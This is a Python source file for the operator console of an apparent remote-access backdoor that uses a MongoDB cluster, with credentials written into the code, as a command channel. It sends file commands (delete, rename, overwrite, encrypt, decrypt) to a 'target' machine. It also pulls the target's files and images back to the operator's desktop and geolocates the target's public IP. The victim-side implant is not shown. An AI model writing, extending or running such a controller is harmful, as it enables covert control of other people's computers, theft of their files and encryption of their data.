import pymongo
import json
from PIL import Image as im
import numpy as np
import requests
from colorama import Fore,init
import os


MY_FAV_ROOT=f'C:\\Users\\{os.getlogin()}\Desktop'
MY_FAV_FOLDER='ShellUtsav'

init(autoreset=True)

con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"

client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)

db=client['shell']

MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','showimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles']

CWD=r""
LAST_PATH=""
TARGET=""
IP=""
PUBLIC_IP=""
PREV_COMMAND=""
SHELL_RESULT=False

def targetInfo():
    global PUBLIC_IP
    if PUBLIC_IP:
        response = requests.get(f'http://ip-api.com/json/{PUBLIC_IP}').json()
        try:
            city=response.get("city")
            region=response.get("regionName")
            country=response.get("country")
            public_ip=PUBLIC_IP
            lat=response.get("lat")
            lon=response.get("lon")
            isp=response.get('isp')
            location_data =[
            f"Public_IP --> {public_ip}",
            f"city --> {city}",
            f"region --> {region}" ,
            f"country --> {country}",
            f"Latitude --> {lat}",
            f"Longitude --> {lon}",
            f"Internet Service Provider --> {isp}"
            ]
            print(Fore.CYAN+">>> ")
            for i in location_data:
                print(i)
            print()
        except:
            print(Fore.CYAN+">>> ")
            print("Something went wrong!!!")
    else:
        print(Fore.CYAN+">>> ")
        print("No Public IP Found!!!")
        
    

def getTargetMachine():
    global TARGET,IP,PUBLIC_IP
    col=db['systemInfo']
    x=col.find_one()
    if x:
        TARGET=x['hostname']
        IP=x['ip']
        PUBLIC_IP=x['public_ip']
        return x['hostname'],x['ip']
    else:
        TARGET='None'
        IP='None'

def operation():
    global CWD
    leng=len(CWD)-1
    arr=[]
    while leng>=1:
       if CWD[leng]=='\\':
            break
       arr.append(leng)
       leng=leng-1 
    strr=""
    arr=sorted(arr)    
    for i in arr:
        strr=strr+CWD[i]
    CWD=CWD.replace(strr,"")

def clearCollection():
    global TARGET
    col=db['myshell']
    col2=db['shellresult']
    filters={
        "target":TARGET
    }
    another_filer={
        "hostname":TARGET
    }
    try:
        col.delete_many(filters)
        col2.delete_one(another_filer)
    except Exception as e:
        print(e)


def binaryContent():
    global MY_FAV_ROOT,MY_FAV_FOLDER
    if not (os.path.exists(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")):
        os.mkdir(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")
    col=db['shellresult']
    filters={
            "hostname":TARGET
        }
    while True:
        res=col.find_one(filters)
        if res:
            data=(res['result'])
            file_name=(res['filename'])
            binary=data.encode('latin-1')
            with open(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}"+f"\{file_name}",'wb') as f:
                f.write(binary)
            clearCollection()
            break
    

def imageShow():
    col=db['shellresult']
    filters={
            "hostname":TARGET
        }
    while True:
        res=col.find_one(filters)
        if res:
            arry = np.array(res['result'])
            data = im.fromarray(arry.astype('uint8'))
            data.show()
            clearCollection()
            break


def is_directory_change_command():
    global PREV_COMMAND
    global CWD
    global LAST_PATH
    a= (PREV_COMMAND.split(" "))

    if a[0]=='cd':
        if a[1] in ['C:\\','D:\\','E:\\','F:\\','G:\\','H:\\']:
            CWD=a[1]
            PREV_COMMAND=a[1]
        if (a[1])[0]=='\\':
            print(Fore.CYAN+">>> ")
            print("invalid navigate")
        else:
            if CWD and CWD[len(CWD)-1]!='\\':
                a[1]='\\'+a[1]
            CWD=CWD+f'{a[1]}'
            LAST_PATH=f'{a[1]}'
    elif a[0]=='cd..':
            operation()


def ActionUploader():
    global PREV_COMMAND,CWD,MY_COMMANDS
    a= (PREV_COMMAND.split(" "))
    col=db['myshell']
    clearCollection()

    if a[0]=='commands' and len(a)==1:
        print(Fore.CYAN+">>> ")
        for i in MY_COMMANDS:
            print(i)
        print()

    elif a[0]=='showimg':
        target_element=a[1]
        data={
                "action":a[0],
                "target":TARGET,
                "current_path":CWD,
                "target_element":a[1],
                "new_filename":"",
                "target_string":"",
                "process_taken":0
                }
        try:
                if not (col.find_one()):
                    col.insert_one(data)
                    imageShow()
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    imageShow()
        except Exception as e:
                print(e)
        
    elif a[0]=='targetinfo':
        targetInfo()

    elif a[0]=='getalltypefiles':
        target_element=a[1]
        data={
                "action":a[0],
                "target":TARGET,
                "current_path":CWD,
                "target_element":a[1],
                "new_filename":"",
                "target_string":"",
                "process_taken":0
                }
        try:
            if not (col.find_one()):
                col.insert_one(data)
                binaryContent()
            else:
                filters={
                    "target":TARGET
                    }
                col.delete_one(filters)
                col.insert_one(data)
                binaryContent()
        except Exception as e:
                print(e)
        
    
    else:
        if a[0] not in ['cd','cd..','exit','e','quit','q','commands']:
            action=a[0]
            current_path=CWD
            target=TARGET
            if len(a)==2:
                target_element=a[1]
                data={
                "action":action,
                "target":target,
                "current_path":current_path,
                "target_element":target_element,
                "new_filename":"",
                "target_string":"",
                "process_taken":0
                }
            elif len(a)>=3:
                if a[0]=='updatefile':
                    target_element=a[1]
                    target_string=""
                    for i in range(2,len(a)):
                        target_string=target_string+a[i]+" "
                    data={
                        "action":action,
                        "target":target,
                        "current_path":current_path,
                        "target_element":target_element,
                        "target_string":target_string,
                        "new_filename":"",
                        "process_taken":0
                        }
                elif a[0]=='renamefile':
                    target_element=a[1]
                    new_filename=a[2]
                    data={
                        "action":action,
                        "target":target,
                        "current_path":current_path,
                        "target_element":target_element,
                        "new_filename":new_filename,
                        "target_string":"",
                        "process_taken":0
                        }
            else:
                data={
                "action":action,
                "target":target,
                "current_path":current_path,
                "target_string":"",
                "target_element":"",
                "new_filename":"",
                "process_taken":0
                }
            try:
                if not (col.find_one()):
                    col.insert_one(data)
                    result_for_shell(a[0])
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    result_for_shell(a[0])
            except Exception as e:
                print(e)


def display(res):
    print(Fore.CYAN+">>> ")
    if(type(json.loads(res['result']))==list):
        for i in (json.loads(res['result'])):
            print(i)
    else:
        print(json.loads(res['result']))
    print()
    clearCollection()


def result_for_shell(command):
    if command not in ['cd','commands','cd..','exit','e','quit','q','deletefile','updatefile','mkdir','rmdir','createfile','renamefile','encrypt','decrypt']:
        col=db['shellresult']
        filters={
            "hostname":TARGET
        }
        while True:
                res=col.find_one(filters)
                if res:
                    display(res)
                    break



def shell():
    global CWD
    global PREV_COMMAND
    global TARGET,IP
    getTargetMachine()
    while True:
        struct0=(Fore.LIGHTYELLOW_EX+CWD)
        struct1=(Fore.LIGHTGREEN_EX+f"(target@{TARGET})-->IP: {IP}-[{struct0}]\n")
        struct2=(Fore.CYAN+"$ ")
        shell_struct=struct1+struct2
        command=str(input(shell_struct))
        PREV_COMMAND=(command)
        is_directory_change_command()
        ActionUploader()
        if command in ['exit','e','quit','q']:
            clearCollection()
            break



shell()